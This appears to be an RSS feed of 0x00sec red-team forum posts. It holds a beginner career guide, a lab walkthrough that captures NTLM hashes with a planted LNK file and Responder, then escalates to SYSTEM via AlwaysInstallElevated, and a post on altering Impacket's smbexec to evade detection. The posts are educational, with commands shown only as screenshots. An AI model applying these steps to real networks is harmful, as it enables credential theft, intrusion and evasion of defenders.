<h3><a href="https://stealthbits.com/blog/how-to-detect-pass-the-ticket-attacks/" target="_blank" rel="noopener nofollow ugc">How to Detect Pass-the-Ticket Attacks</a></h3>

<p>In this post we dive into how pass the ticket attacks work &amp; detection. In a pass-the-ticket attack, an attacker is able to extract a Kerberos TGT (Ticket-Granting-Ticket).</p>

  <p><span class="label1">Est. reading time: 7 minutes</span>
    </p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            <p><small>7 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/playing-with-hashes-and-tickets/26604">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/playing-with-hashes-and-tickets/26604</link>
          <pubDate>Sun, 18 Jul 2021 21:17:00 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-26604</guid>
          <source url="https://0x00sec.org/t/playing-with-hashes-and-tickets/26604.rss">Playing with Hashes and Tickets</source>
        </item>
        <item>
          <title>Starting in Red Team</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <h1>
<a name="starting-in-red-team-1" class="anchor" href="https://0x00sec.org#starting-in-red-team-1"></a>Starting in Red Team</h1>
<p>This is a path I would like to talk about since I was working on my own to get to where I finally am. A Jr Red Team Operator, now we all ask ourselves this question when we start, “Where do I start?”. Well, this used to be a difficult question to answer as even I had some problems all I wanted to do was Hack I did not care what it was, I just wanted to get started. Once I did, you start finding the love and interest on the categories of hacking that you would like to focus on.</p>
<p>Yeah, you can be a “Jack of all trades, master of none” I mean here in hacking that is usually something hard to do, since in the working world they want you to be good at something specific, it could be programming, Initial Access, Lateral Movement, Privilege Escalation, <em>yada yada</em> . But here, you need to do what you like most or believe me you will be miserable it is just a fact. I am no expert or nothing, as there is so much that gets my attention, it could be Initial Access (Do see how I specify on Red Team only, but I might jump to other stuff), Enumeration, Lateral Movement, Privilege Escalation, Exploitation, Malware Development, Bypasses and so on and so on, I can honestly keep going since the list is immense on stuff that you can learn with hacking.</p>
<p>You thought it was only computers!! Nah, you got some jokes there it you think that way. You can hack refrigerators, Microwaves, Toasters, Cell Phones, damn anything with a radio signal or Internet is accessible to you.</p>
<p>But let me show you the path I took to reach here, you will notice this is more of a rough draft on some poorly written steps since I always moved around until I found my pace but let me get started.</p>
<p><strong>Vulnhub</strong></p>
<p>Ahh the holy grail, the Garden of Eden. Usually, the first place we beginners stumble upon when we type “How to Hack”, this incredible website developed by the famous g0tm1lk hosts various vulnerable machines that you can download and fire up to start hacking in the safety of your personal home environment, can’t talk a lot on this since it’s better if you see so yourselves.</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://www.vulnhub.com/static/img/favicon.ico" class="site-icon" width="64" height="64">
      <a href="https://www.vulnhub.com/" target="_blank" rel="noopener nofollow ugc">vulnhub.com</a>
  </header>
  <article class="onebox-body">
    

<h3><a href="https://www.vulnhub.com/" target="_blank" rel="noopener nofollow ugc">Vulnerable By Design ~ VulnHub</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p><strong>Hack The Box</strong></p>
<p>Yes, yes hackthebox the best alternative once you start running out of storage from your personal PC, and just want to start hacking this incredible site hosts a ton of vulnerable machines that go from Easy to Insane levels of difficulty it was a great experience and since this, it has been almost 2 years since I joined other great things have been added that helped on my focus with Red Team such as the ProLabs, a best place to continue practicing and don’t forget ippsecs videos since they are great and ridiculously easy to follow. The amazing thing is that he explains the attacks as well, not just throws you into <em>ok run this command and you got in.</em></p>
<p><a href="https://app.hackthebox.eu/login" class="onebox" target="_blank" rel="noopener nofollow ugc">https://app.hackthebox.eu/login</a></p>
<p><strong>TryHackMe</strong></p>
<p>Another incredible site for hosting vulnerable machines, some of the key differences about tryhackme that differs with hackthebox is that you are GUIDED throughout the machine, there are steps to follow to reach your goal. So, this is a great alternative to hackthebox since you will fire up a machine have a guide to follow and learn while doing. I think this is a great way to approach newcomers by doing while learning, they also have a great offensive path to follow that will get you closer to red team or offensive security, you should also check the other paths that are available and the pro labs since they are immensely useful and a very great place to start learning into Active Directory.</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/9/b/9b91f2f3f422108929e12a82a6d4108bd7f44455.png" class="site-icon" width="489" height="499" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/9/b/9b91f2f3f422108929e12a82a6d4108bd7f44455_2_10x10.png">
      <a href="https://tryhackme.com/login" target="_blank" rel="noopener nofollow ugc">TryHackMe</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/362;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/b/9/b9f6ed397d49a65c41c6fc042a8d5c6a45d6b1d6_2_690x362.png" class="thumbnail" width="690" height="362" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/b/9/b9f6ed397d49a65c41c6fc042a8d5c6a45d6b1d6_2_690x362.png, https://0x00sec.s3.amazonaws.com/optimized/3X/b/9/b9f6ed397d49a65c41c6fc042a8d5c6a45d6b1d6_2_1035x543.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/b/9/b9f6ed397d49a65c41c6fc042a8d5c6a45d6b1d6.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/b/9/b9f6ed397d49a65c41c6fc042a8d5c6a45d6b1d6_2_10x10.png"></div>

<h3><a href="https://tryhackme.com/login" target="_blank" rel="noopener nofollow ugc">TryHackMe | Cyber Security Training</a></h3>

<p>An online platform for learning and teaching cyber security, all through your browser.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p><strong>OSCP</strong></p>
<p>Ok, ok this is not a lab and place to learn but this is the first course I took when trying to jump into the cybersecurity workspace, when new to this your eyes sparkle at the fact that this exam is hands-on nothing about multiple choice test, you get 5 machines, hack them! And gain your certificate an incredible way to demonstrate not only that you understand cybersecurity but that you can also implement it on the real world.</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/9/7/97a108c01ac064a9b707e0b96ffb04f115d721bc.png" class="site-icon" width="32" height="32">
      <a href="https://www.offensive-security.com/courses-and-certifications/" target="_blank" rel="noopener nofollow ugc">offensive-security.com</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/361;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/3/234a3d6bd77d35c0820a5ec78b3e5102e0c4cdf1_2_690x361.png" class="thumbnail" width="690" height="361" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/3/234a3d6bd77d35c0820a5ec78b3e5102e0c4cdf1_2_690x361.png, https://0x00sec.s3.amazonaws.com/optimized/3X/2/3/234a3d6bd77d35c0820a5ec78b3e5102e0c4cdf1_2_1035x541.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/2/3/234a3d6bd77d35c0820a5ec78b3e5102e0c4cdf1.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/2/3/234a3d6bd77d35c0820a5ec78b3e5102e0c4cdf1_2_10x10.png"></div>

<h3><a href="https://www.offensive-security.com/courses-and-certifications/" target="_blank" rel="noopener nofollow ugc">Courses and Certifications | Offensive Security</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p><strong>MITRE ATT&amp;CK</strong></p>
<p>Oh boy, oh boy was this one enlightening, this place was the best thing I have ever reached out too when trying to step my game up into Red Teaming. It was incredible but damn was it difficult, the thing about ATT&amp;CK is, this place is not much of a learning grounds or course. It is a framework that explains the TTP (Tactics, Techniques and Procedures) that APT (Advanced Persistent Threats) take when trying to compromise a Network. This place IS THE PLACE we all need to look at when working into Red Team, forget everything and jump on this (well maybe don’t forget). For me to understand these techniques and learn the tactics, tools or anything related to Red Team (Shameless plug) I wrote a gitbook that helped me grasp the information on the techniques, but fair warning I mostly wrote it only focusing on the Windows side of things, Linux is cool, but you hardly see it, and Mac is pricey didn’t want to research it at all back then, maybe now would be good.</p>
<p><a href="https://attack.mitre.org/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://attack.mitre.org/</a></p>
<p>Plug</p>
<p><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://dmcxblue.gitbook.io/red-team-notes-2-0/</a></p>
<p>RTO by ZeroPointSecurity</p>
<p>Aaah this course, so many things about this, I do not know, I just do not know, let me start with some simple words, amazing it is, amazing. Elegant yet simple, it has a finesse that I have not encountered in some other courses. This course WILL have you thinking and doing a ton of Red Team it follows the MITRE Framework in a simple yet sophisticated way. We go through Initial Access and end with Exfiltration, you will start from 0 to creating your Phishing payload to moving to Domain Admin and Exfiltrating Data, I have nothing but good things about this course and the best part? You get access to updates Forever, para siempre, per sempre. Yes, sir you heard that right attacks are getting more sophisticated and we are always presented with new techniques this course keep up to date in its knowledge and its labs. I highly recommend this. This was my first red team related course. Do take this, yes go, now.</p>
<p><a href="https://www.zeropointsecurity.co.uk/red-team-ops" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.zeropointsecurity.co.uk/red-team-ops</a></p>
<p>Pentester Academy Red Team Labs</p>
<p>And finally, Pentester Academy I had approached this labs in the past but the other modules not the Red Team section, this was new when I discovered it some time back, it is really focus on Active Directory Attacks which Red Team is heavily concentrated on, the course was great, very useful and a great way to jump into Active Directory Techniques, I tried this once and I failed. Yep, that was almost more than a year ago and probably will jump back to it later in the future.</p>
<p><a href="https://www.pentesteracademy.com/redlabs" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.pentesteracademy.com/redlabs</a></p>
<p>So as you can see this is the path I took to get my foot in the door, always try to keep my blog updates, github, anything I could to stay active with the community since it’s great to have friends which you can talk about and throw ideas when trying to work on Red Team stuff, it doesn’t have to be red team it can be other things, I do thank all the people I met when trying to reach my goal, some thought me Reverse Engineering, Exploits, Web Apps, Scripting and many other things.</p>
<p>I will always Thank You.</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d36cc0e86b91ffb045078967592725343b2158d6.jpeg" class="site-icon" width="32" height="32">
      <a href="https://dmcxblue.net/2021/06/06/starting-in-red-team/" target="_blank" rel="noopener nofollow ugc" title="05:45PM - 06 June 2021">DMCXBLUE – 6 Jun 21</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6623899f9ff113725012267e1559f59940bc3f44.jpeg" class="thumbnail onebox-avatar" width="200" height="200">

<h3><a href="https://dmcxblue.net/2021/06/06/starting-in-red-team/" target="_blank" rel="noopener nofollow ugc">Starting in Red Team</a></h3>

<p>This is a path I would like to talk about since I was working on my own to get to where I finally am. A Jr Red Team Operator, now we all ask ourselves this question when we start, “Where do I…</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            <p><small>6 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/starting-in-red-team/26241">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/starting-in-red-team/26241</link>
          <pubDate>Sun, 06 Jun 2021 17:46:36 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-26241</guid>
          <source url="https://0x00sec.org/t/starting-in-red-team/26241.rss">Starting in Red Team</source>
        </item>
        <item>
          <title>The Importance of Enumeration</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>We all love Exploitation and gaining access to a machine elevate our privileges and gain that SYSTEM, Administrator, Domain Admin Shell. It’s a rush that us as hackers love to see when we try to gain access to a box “Meterpreter Session 1 Opened”, Beacon, Grunt, etc. Oof hasn’t that been one of the most awesome sentences that you can see on your terminal when something you’ve been working on just works.</p>
<p>But how do we get here?. We don’t magically know the payload that needs to be used, or the exploit to use against our victim machine.</p>
<p><strong>Enumeration</strong> , that one very important step taken before we continue with our hacks around the network. Can we access the machine?. Enumeration. Can we exploit it?. Enumeration. What about Privesc, Enumeration. Anything on Persistence? Yep let’s enumerate to see what’s allowed as a user OR where to leave our backdoor that can blend with the environment, need to move around the Environment?, lets enumerate and see what is available.</p>
<p>Here I will demonstrate how enumeration can be achieved in many ways and also the variety of tools used for the same category so that you don’t have to be limited to this very well-known tools. For example nmap, everyone uses nmap the famous port scanning tool with incredible functionality that works well everywhere, but let’s not forget we have other tools, <strong>unicornscan, masscan, amap, rustscan.</strong> Let me work on an environment and show a variety of ways to enumerate and reach our goal and not be dependent on well-known tools.</p>
<p><strong>Initial Access</strong></p>
<p>My target machine is 10.0.2.24 I will start enumerating and search for access here see a way to gain an initial foothold.</p>
<p>As my scan from different tools finished these were my results.</p>
<p><strong>Nmap:</strong></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf67f34d522d9ad78193aeef5840a45df29d2344.png" data-download-href="/uploads/short-url/tANy2GgUWHiSHTVpjl9tMhoLNgU.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cf67f34d522d9ad78193aeef5840a45df29d2344_2_506x500.png" alt="" data-base62-sha1="tANy2GgUWHiSHTVpjl9tMhoLNgU" width="506" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cf67f34d522d9ad78193aeef5840a45df29d2344_2_506x500.png, https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf67f34d522d9ad78193aeef5840a45df29d2344.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf67f34d522d9ad78193aeef5840a45df29d2344.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cf67f34d522d9ad78193aeef5840a45df29d2344_2_10x10.png"></a></div><p></p>
<p><strong>Rustscan:</strong></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf67f34d522d9ad78193aeef5840a45df29d2344.png" data-download-href="/uploads/short-url/tANy2GgUWHiSHTVpjl9tMhoLNgU.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cf67f34d522d9ad78193aeef5840a45df29d2344_2_506x500.png" alt="" data-base62-sha1="tANy2GgUWHiSHTVpjl9tMhoLNgU" width="506" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cf67f34d522d9ad78193aeef5840a45df29d2344_2_506x500.png, https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf67f34d522d9ad78193aeef5840a45df29d2344.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf67f34d522d9ad78193aeef5840a45df29d2344.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cf67f34d522d9ad78193aeef5840a45df29d2344_2_10x10.png"></a></div><p></p>
<p><strong>And amap:</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/8/08ce0f7d4ee58bdb67692494022a8048acf13c70.png" alt="" data-base62-sha1="1fTiKh8kaJDX4zLMieTB5uGFpba" width="624" height="158"></p>
<p>With different tools for enumeration this may help in confirmation on what is going on, tools might use different methods to acquire information about a specific target. In this matter I can confirm that these ports are open as different tools have confirmed this now I can move forward and attack these ports or gain more information on them to lower my chances of failure when try to exploit these targets.</p>
<p>So let’s approach 135/139:</p>
<p>Rpcclient we will approach this port and enumerate with and without credentials (realistically this wouldn’t be available since it would most likely be a Blackbox test).</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/8/08ce0f7d4ee58bdb67692494022a8048acf13c70.png" alt="" data-base62-sha1="1fTiKh8kaJDX4zLMieTB5uGFpba" width="624" height="158"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/3/8/381fafd367808a5108dce9c8a823e7a42457f129.png" alt="" data-base62-sha1="80uCSlSeQzyzVDjT0KpFp3tz0RX" width="624" height="170"></p>
<p>As seen above I am trying to enumerate users but this is most likely not going to happen with an anonymous user we will try with someone with credentials.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/e/2e67fd5ff31953365b5885b4e36673ed93995a5a.png" alt="" data-base62-sha1="6CwL9UoWSivv3Mj8GtCyEl5AzKq" width="485" height="99"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/4/a4647b67fbcd8378cc0125bf170a940bb79878f6.png" alt="" data-base62-sha1="nshAoi4Fy46PPlAmbiwUmxqQphk" width="422" height="82"></p>
<p>No luck with rpcclient as the user is not part of a Domain and only from the local machine, we can continue grabbing more info that is needed from the local machine but we will stop here.</p>
<p>Now let’s approach the 445 port (SMB):</p>
<p>I have used 3 different tools with the approach on anonymous enumeration but I had no luck finding shares <strong>smbclient, smpmap, smbclient.py from impacket</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/4/a4647b67fbcd8378cc0125bf170a940bb79878f6.png" alt="" data-base62-sha1="nshAoi4Fy46PPlAmbiwUmxqQphk" width="422" height="82"></p>
<p>I can also use the <strong>crackmapexec</strong> tool and I can see that the anonymous user has access to a share named Scans</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/3/433c123e279402b6215fe43af0aa995054d26705.png" alt="" data-base62-sha1="9AMGWmGJ137ssxwwYRrekl6B4P3" width="624" height="144"></p>
<p>From here you can choose your favorite tool to access the share and start exploring what is going on in that share.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/f/8f2affb38420370a347d76c1553e73312035b291.png" alt="" data-base62-sha1="kqwoYybbJh57PuvX5nnjiC5A40h" width="624" height="445"></p>
<p>Seems that we have a File that advises people to upload there work so it can be reviewed at the end of the day, the fact that we know this means that there is a user accessing this share at A certain time we can use this to taint the share and have it send us an NTLMv2 hash and try to crack it, so let us try and grab the hash of this user with the help of Responder.</p>
<p>I will build a LNK file with the ICON of the LNK pointing to my Machine so when Windows tries to load it, it will reach responder now I wait until the user browses the Share once that happens I will have responder listening on my attacking machine and capture the NTLM hash</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/5/c/5cb20cc7a373e8d54a69498deda6d128ae443ce4.png" alt="" data-base62-sha1="de1oDUcbYM1nedAPUijjtCPxjH6" width="624" height="304"></p>
<p>Then I use PUT from smbclient and move the file on the share with my anonymous access to the share utilizing SMBCLIENT</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/a/6aa5c3dd229bf254264109d27a8e25dbed2a2457.png" alt="" data-base62-sha1="fdrLeTYyYovS2vwNAEr8A5Bm31d" width="624" height="166"></p>
<p>I add the file (LNK) and once the share is browsed Windows will search for the ICO that is pointing to my attacking machine</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/8/48f7d334cbbd6a97e87c4756d055f448a48660eb.png" alt="" data-base62-sha1="apvl71Nj4DoLak9NFIJ5Y5e7xIT" width="624" height="193"></p>
<p>And hashes are captured</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/f/5/f59f0288a6205f61c2c8c386e61aa171406f90c0.png" alt="" data-base62-sha1="z2REL1v2tVKu5dhfzqo2BrjzAGc" width="624" height="343"></p>
<p>Now we will use these hashes to crack the password, my favorite is using hashcat and a few rules “One_rule_to_rule_them_all” (Do let me know if I messed up the name). And here I like using Windows for hashcat</p>
<p>And we managed to crack the Hash</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/3/a/3ab7f1b35aaa54a618a12ea779d82188735bccac.png" alt="" data-base62-sha1="8nrN5ESaHJ2zU3IZeItK4MKADOQ" width="624" height="98"></p>
<p>Once we have the credentials let us try them and see what Adrian’s permissions are on the machine. Will utilize crackmapexec.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/9/1942842fb6c1710895994578a4ac6d1426616df7.png" alt="" data-base62-sha1="3BsrJLEPASRr9veoMok6UYHyjDp" width="624" height="141"></p>
<p>Fantastic we have credentials, but now from our limited options let us try and get a Shell on the machine from checking out nmap again we see that there is PSRemote available</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/c/dc4fc1c7cce1e82f441b1b1a634c626f769138a5.png" alt="" data-base62-sha1="vqXVa7frSjbUNte02c7STK5qPCB" width="624" height="343"></p>
<p>Let’s use this and get a connection.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/9/89202fbf2eb2a4672dd2b5140f0f491563c56d6a.png" alt="" data-base62-sha1="jz4n6MLidNwNOREqmblYJRbrzmi" width="624" height="204"></p>
<p>Now I will upgrade my Shell to a Grunt from Covenant C2 (Just my taste). Now that we have our Grunt With Medium Integrity and running on PowerShell with the user anovoa time to Privesc to a higher user.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/7/a7a77b0ce139f704be57beea44f97bcaf5248a10.png" alt="" data-base62-sha1="nV8yV4MwoAHJBrOL7NKEDx8s17q" width="624" height="141"></p>
<p>I will use the SharpUp Task to gain information on how to Privesc but I will also use another favorite as I really love the output and the details check it has PrivescCheck.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/a/2aed941d304ada848123f4dbd4edbd1a6923f3ff.png" alt="" data-base62-sha1="67L3W5rnAl3trpWrcOXva2dZuEL" width="407" height="121"></p>
<p>AlwaysInstall Elevated Key OK good sign we can use this, I always have the option to validate with PrivescCheck or by querying the Registry Keys manually</p>
<p>PrivescCheck</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/1/419486dea53167c0a2636b0b6867047d9b83e3d2.png" alt="" data-base62-sha1="9m9fFYsv9s2MuaQN3mApwqvn4SS" width="624" height="345"></p>
<p>Now let us upload our MSI Installer built from VS with a GruntSMB and grab a higher privileged Grunt.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/0/100158ed2a4343cb68689e1bcbd359a5e0a7b0a9.png" alt="" data-base62-sha1="2hAwCUv0vXQZGYs7RBIkMcOakkN" width="503" height="101"></p>
<p>I will execute using msiexec and connect back to the Grunt with higher privileges</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/9/6/96a16a013c69f506a733b54fa39e294c5a8de4ee.png" alt="" data-base62-sha1="luxrOzSVVEb5JWtXtnY2z6otJ2C" width="537" height="199"></p>
<p>No worries if it hangs on Tasked its normal behavior, we can see our new grunt as SYSTEM</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/e/f/ef142a86d6a794349ad9cf784e6506252d9d25a8.png" alt="" data-base62-sha1="y6ZjUv3NQlqMRsBgSAmUT4DHMeI" width="624" height="54"></p>
<p>And from here we can continue our enumeration and move forward with Compromising the Domain or leaving a persistent access or much more, the reason for this was to demonstrate the importance of enumeration as (Myself as well) I read that various people are just trying to throw exploits to machines and saying, “It doesn’t work”. Trying to search for ports, users, services, privilege escalation methods and others. I hope this has been helpful and maybe learned something from it.</p>
<p>Dumping Hashes from SAM (Got an error because Covenant is using and older version of Mimikatz, well the version I am using)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/f/4f4651cdf3325f7ac84f7f62ae3d193c59999c42.png" alt="" data-base62-sha1="bjinvh5e4oeQ9LCpnEKhgw5CgCK" width="401" height="383"></p>
<p>Happy Hacking!</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/the-importance-of-enumeration/25314">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/the-importance-of-enumeration/25314</link>
          <pubDate>Sat, 20 Mar 2021 22:45:37 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-25314</guid>
          <source url="https://0x00sec.org/t/the-importance-of-enumeration/25314.rss">The Importance of Enumeration</source>
        </item>
        <item>
          <title>A Dive on SMBEXEC</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>One of the things that makes a good red teamer is to understand our tools. I noticed recently how these tools are being looked at and I demonstrate a little on what we can do about these well known attacks.</p>
<p>We all know the glorious Impacket tools, very well known in the Cybersecurity Community and hackers among us. Today I will take a look at the Impacket tools. I was recently surprised by how these tools get detected and why are they found while Threat Hunting, I also wanted to understand on why it was happening. And while searching I was mind blown, probably old to some people but damn I wanted to write about it.</p>
<p>I will work with SMBEXEC on this talk.</p>
<p>Now let’s check a little the SMBEXEC code. One of the first things that stand out to me is some BAT files and output files that seems to be written onto the target machine when executed.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/0/d07aa09b14e99f296e3d0f66760ea56650a4980e.png" alt="" data-base62-sha1="tKi2AzWHQmUMzDJN5VSK4X43sMS" role="presentation" width="513" height="140"></p>
<p>Let’s run the tool and see what happens out of the box to take a better look at what is going on with this tool.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/4/0418a3504b108b30dcd746ac7ad9dc88eeb5487e.png" alt="" data-base62-sha1="AeHb5x8obazMGlLoPwh81HD62i" width="690" height="237" role="presentation"></p>
<p>As expected</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/a/2a1d12f588a0ccd971584ec5b7ba94ef568c9fd1.png" alt="" data-base62-sha1="60ylmO62kRReH8TWr80TjjeXN4J" role="presentation" width="403" height="196"></p>
<p>But, why?. Let’s take a look at what happened.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/e/1ec11d536ec0418a513ded9526f6466d8c85b487.png" alt="" data-base62-sha1="4o44lBPTUiYdJpP1dQTmHczoKtp" role="presentation" width="478" height="399"></p>
<p>Oh, so I’s a command line that is getting detected, it does seem to be strange that an Administrator Account tries to Write a bat file onto the Temp Folder, Execute it and then remove it. Right?.</p>
<p>Now let’s take a look at the part of Impacket that gets detected and find this piece of code. We are well aware that we have a section of the code where it’s creating the execute.bat file</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/9/4981359892af0d597d8cd9ac1847ce69b059bfc8.png" alt="" data-base62-sha1="aufGtATWv49KvRGmjDL7jrngSla" role="presentation" width="434" height="139"></p>
<p>Now I changed the code and found some “synonyms” of each of the words that were hardcoded onto the tool, I had no idea what BTO meant so I chose a more “legitimate” service name.</p>
<p>Now let’s try running the tool again. <strong>[Remember we still haven’t changed the command, wanted to test if this was enough to bypass]</strong> .</p>
<p>Damn it, no luck at all.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/0/d07c28b96575b7dc0b2f4a087b07d3374399f62d.png" alt="" data-base62-sha1="tKlk3lWLKMrybhAujNUIw2eXAV7" role="presentation" width="551" height="407"></p>
<p>Ok, now let’s dig a little deeper on the command line this time.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/7/679acc1fad1b2ad852614430f5e07504ff28c56f.png" alt="" data-base62-sha1="eMwPxobxiQr0xOyLPQ1EuJ2gTRZ" width="690" height="195" role="presentation"></p>
<p>Ok, let’s see the <strong>self._output</strong> section, looks for the local drive C$ (Accessible to Administrator) smbexec will choose this by default if no other is selected, will continue to output the BAT file, execute it and then proceed to delete it. But look here, it seems to be calling <strong>cmd.exe</strong> using an environment variable for all this to run. Let us take a quick look at our variables for Windows.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/5/c5c79f7dc673bbf1c5bbfe4d3d8b1b710edc23cb.png" data-download-href="/uploads/short-url/sdDKCJjM4TDfiI4yZFKDZlrnvtN.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/c/5/c5c79f7dc673bbf1c5bbfe4d3d8b1b710edc23cb.png" alt="" data-base62-sha1="sdDKCJjM4TDfiI4yZFKDZlrnvtN" role="presentation" width="507" height="500" data-dominant-color="282827"></a></div><p></p>
<p>Aaaah so there we go, cmd.exe now, in what other ways can we call cmd.exe?, Directly with other variables?. Let’s go down a little further.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/8/1893f13da6efe21141263f8aa3d8c5258a4b3082.png" alt="" data-base62-sha1="3vqqj2kfcG2H1DNki1HQlK9UPmi" role="presentation" width="349" height="186"></p>
<p>Here are some interesting ones, <strong>%SystemDrive%, %SystemRoot%, %windir%.</strong> Great we have 3 options to have our way and execute cmd.exe, let’s try these for our tool smbexec.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/e/6ed94cb310a3017a481a96f2398bf6e3270ade26.png" alt="" data-base62-sha1="fOC5cW9y3uFnFRjSuirtYskcsAu" role="presentation" width="624" height="55"></p>
<p>Ok, so I edited it for it to call cmd.exe in a different manner I will use 1 variable and add the other part of the path to reach <strong>cmd.exe</strong></p>
<p>Let’s see what happens:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/a/6a2bf6528e6699f480816b9ad5d40df682448eba.png" alt="" data-base62-sha1="f9eNCTr6RfrmnQeIC7VnTqH4uMi" role="presentation" width="547" height="406"></p>
<p>Damn it’s still getting caught, let’s dive a little more, so what other thing can get detected besides our different variables that are used, oh your thinking the same right?. Exactly the parameters, very smart. But which one is it? /Q or /c maybe both???. Let’s not take a risk and do something about that.</p>
